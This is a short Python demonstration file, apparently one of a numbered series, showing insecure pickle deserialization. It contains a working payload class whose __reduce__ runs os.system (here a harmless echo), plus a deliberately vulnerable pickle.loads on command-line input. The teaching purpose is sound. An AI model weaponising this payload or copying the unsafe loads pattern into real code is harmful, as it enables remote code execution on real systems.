# Dangerous: Insecure pickle.loads
# Run: python ex-010-insecure-pickle.py
# Reference: https://docs.python.org/3/library/pickle.html#security-limitations

import pickle
import base64
import sys

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('echo PWNED_from_pickle',))

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'make':
        data = base64.b64encode(pickle.dumps(RCE())).decode()
        print(data)
    else:
        b64 = sys.argv[1] if len(sys.argv) > 1 else base64.b64encode(pickle.dumps('hello')).decode()
        obj = pickle.loads(base64.b64decode(b64))  # VULNERABLE
        print('Loaded:', obj)
